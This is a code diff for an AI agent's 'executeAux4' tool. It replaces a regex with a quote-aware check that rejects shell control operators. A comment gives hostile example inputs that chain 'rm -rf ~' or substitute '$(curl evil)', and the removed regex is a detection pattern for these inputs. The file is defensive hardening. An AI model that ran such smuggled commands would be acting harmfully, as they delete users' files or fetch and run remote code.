@@ -8,6 +8,7 @@ import { tool } from "@langchain/core/tools";
 import LlmStore from "./LlmStore.js";
 import { getEmbeddings } from "./Embeddings.js";
 import { matchesPattern as matchesPatternUtil, parsePattern as parsePatternUtil } from "./PatternUtils.js";
+import { hasShellControlChar } from "./ShellControlGuard.js";
 
 // Import tool descriptions
 import readFileDesc from "../docs/tools/readFile.md?raw";
@@ -658,14 +659,14 @@ function toStrippedForm(command) {
 // executeAux4 runs ONLY aux4 commands — never arbitrary CLI. Commands are executed via
 // `sh -c`, so shell control operators would let a caller chain any binary
 // (`aux4 version; rm -rf ~`) or substitute one (`aux4 $(curl evil)`). Reject them: this is
-// the boundary that makes an aux4-only tool safer than a general bash tool.
-const SHELL_CONTROL = /[;&|`\n\r]|\$\(|\$\{|<\(|>|</;
-
+// the boundary that makes an aux4-only tool safer than a general bash tool. The check is
+// quote-aware (see ShellControlGuard.js) so legitimate quoted content — e.g. a menu path
+// like `--path "File > Save As…"` — is not mistaken for an unquoted redirect.
 function validateAux4Only(fullCommand) {
   if (!/^aux4(\s|$)/.test(fullCommand)) {
     return `Permission denied: executeAux4 runs only aux4 commands, and "${fullCommand}" is not one.`;
   }
-  if (SHELL_CONTROL.test(fullCommand)) {
+  if (hasShellControlChar(fullCommand)) {
     return `Permission denied: executeAux4 runs only a single aux4 command. Shell operators (; && || | \` $() redirects) are not allowed — run one aux4 command per call.`;
   }
   return null;
